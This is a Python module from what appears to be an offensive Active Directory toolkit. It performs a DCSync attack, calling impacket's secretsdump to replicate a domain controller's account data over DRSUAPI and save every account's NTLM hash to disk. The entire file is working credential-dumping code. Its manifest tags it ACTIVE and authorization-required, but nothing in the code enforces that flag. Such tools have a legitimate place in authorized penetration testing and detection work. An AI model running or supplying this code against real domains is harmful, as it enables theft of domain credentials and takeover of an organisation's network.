"""DCSync  -  replicate AD objects to extract NTLM hashes via DRSUAPI."""


import os
import sys
from datetime import datetime, timezone, UTC
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.attack.dcsync.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["drsuapi_replication"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.006"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] DCSync → {args.target} ({args.domain})")

    if not cred.has_password and not cred.has_hash:
        print("[!] DCSync requires domain credentials with replication rights", file=sys.stderr)
        return 1

    try:
        from impacket.examples.secretsdump import DumpSecrets
    except ImportError:
        print("[!] impacket not installed: pip install impacket", file=sys.stderr)
        return 1

    os.makedirs(args.output, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(args.output, f"dcsync_{ts}")

    target_str = f"{args.domain}/{cred.username}"
    if cred.has_password:
        target_str += f":{cred.password}"
    target_str += f"@{args.target}"

    options = type("Options", (), {
        "target": target_str,
        "outputfile": out_path,
        "hashes": cred.impacket_hash if cred.has_hash else None,
        "no_pass": False,
        "k": False,
        "aesKey": None,
        "dc_ip": args.target,
        "use_vss": False,
        "exec_method": "smbexec",
        "just_dc": True,
        "just_dc_ntlm": True,
        "just_dc_user": None,
        "pwd_last_set": False,
        "user_status": False,
        "history": False,
        "resumefile": None,
        "system": None,
        "bootkey": None,
        "security": None,
        "sam": None,
        "ntds": None,
    })()

    try:
        dumper = DumpSecrets(
            remoteName=args.target,
            username=cred.username,
            password=cred.password or "",
            domain=args.domain,
            options=options,
        )
        dumper.dump()
        print(f"[+] DCSync complete: {out_path}.ntds")
        return 0
    except Exception as exc:
        print(f"[!] DCSync failed: {exc}", file=sys.stderr)
        return 1
